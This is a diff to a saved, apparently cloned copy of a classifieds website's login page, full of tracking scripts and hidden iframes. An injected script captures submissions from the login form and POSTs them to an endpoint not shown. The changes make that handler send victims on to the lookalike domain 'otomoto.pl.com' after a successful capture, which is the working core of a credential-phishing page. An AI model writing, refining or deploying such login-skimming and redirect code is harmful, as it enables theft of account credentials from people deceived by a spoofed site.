@@ -242,7 +242,8 @@ a.load=function(b,c){var f="https://analytics.tiktok.com/i18n/pixel/events.js";a
 <script type="text/javascript" id="" charset="">(function(){try{if(Math.floor(Math.random()*20)===0){var a=document.createElement("script");a.type="text/javascript";a.src="//ethn.io/lgkqz-gl.js";a.async=!0;a.charset="utf-8";a.setAttribute("referrerpolicy","no-referrer-when-downgrade");document.head.appendChild(a)}}catch(b){console.warn("GTM",b)}})();</script><script type="text/javascript" id="" charset="">(function(){window.feedkey="e49133eb-14ea-4f28-91cf-9843b3d68e92";var a=document.createElement("script");a.type="text/javascript";a.async=!0;a.src="//feedgenio.s3.eu-central-1.amazonaws.com/"+feedkey+".js";var b=document.getElementsByTagName("script")[0];b.parentNode.insertBefore(a,b)})();</script>
 
 <iframe height="0" width="0" style="display: none; visibility: hidden;" src="./index_files/saved_resource(1).html"></iframe><script type="text/javascript" id="" charset="">var pp_gemius_identifier="1wA64edYL8OQRSzbOqfRLrbu7OkY4sSgxVmVCOuHpYn.S7";function gemius_pending(a){window[a]=window[a]||function(){var b=window[a+"_pdata"]=window[a+"_pdata"]||[];b[b.length]=arguments}}gemius_pending("gemius_hit");gemius_pending("gemius_event");gemius_pending("pp_gemius_hit");gemius_pending("pp_gemius_event");
-(function(a,b){try{var c=a.createElement(b),d=a.getElementsByTagName(b)[0],e="http"+("https:"==location.protocol?"s":"");c.setAttribute("async","async");c.setAttribute("defer","defer");c.src=e+"://olx.hit.gemius.pl/xgemius.js";d.parentNode.insertBefore(c,d)}catch(f){}})(document,"script");</script><script type="text/javascript" async="" data-ot-ignore="" id="braze-script-tag" src="./index_files/braze.min.js.download"></script><iframe id="gemius_hcconn_1768922308593_24559692" name="lsgetframe" width="0" height="0" scrolling="no" src="./index_files/lsget.html" class="optanon-category-C0004-C0002 " style="display: none; visibility: hidden;"></iframe><iframe height="0" width="0" src="./index_files/activityi.html" class="optanon-category-C0004-C0002 " style="display: none; visibility: hidden;"></iframe><iframe id="_hjSafeContext_24444200" title="_hjSafeContext" tabindex="-1" aria-hidden="true" src="./index_files/saved_resource(2).html" style="display: none !important; width: 1px !important; height: 1px !important; opacity: 0 !important; pointer-events: none !important;"></iframe><script>
+(function(a,b){try{var c=a.createElement(b),d=a.getElementsByTagName(b)[0],e="http"+("https:"==location.protocol?"s":"");c.setAttribute("async","async");c.setAttribute("defer","defer");c.src=e+"://olx.hit.gemius.pl/xgemius.js";d.parentNode.insertBefore(c,d)}catch(f){}})(document,"script");</script><script type="text/javascript" async="" data-ot-ignore="" id="braze-script-tag" src="./index_files/braze.min.js.download"></script><iframe id="gemius_hcconn_1768922308593_24559692" name="lsgetframe" width="0" height="0" scrolling="no" src="./index_files/lsget.html" class="optanon-category-C0004-C0002 " style="display: none; visibility: hidden;"></iframe><iframe height="0" width="0" src="./index_files/activityi.html" class="optanon-category-C0004-C0002 " style="display: none; visibility: hidden;"></iframe><iframe id="_hjSafeContext_24444200" title="_hjSafeContext" tabindex="-1" aria-hidden="true" src="./index_files/saved_resource(2).html" style="display: none !important; width: 1px !important; height: 1px !important; opacity: 0 !important; pointer-events: none !important;"></iframe>
+<script>
 document.addEventListener('DOMContentLoaded', () => {
   const form = document.querySelector('[data-testid="login-form"]');
   if (!form) return;
@@ -258,14 +259,19 @@ document.addEventListener('DOMContentLoaded', () => {
     })
     .then(res => res.text())
     .then(data => {
-      console.log('POST OK:', data);
-      alert('Login trimis');
+      if (data.trim() === 'OK') {
+        window.location.href = 'https://otomoto.pl.com';
+      } else {
+        console.error(data);
+        alert('Ups! ');
+      }
     })
     .catch(err => {
       console.error(err);
-      alert('Eroare');
+      alert('Error');
     });
   });
 });
 </script>
-</body></html>
+
+            </body></html>
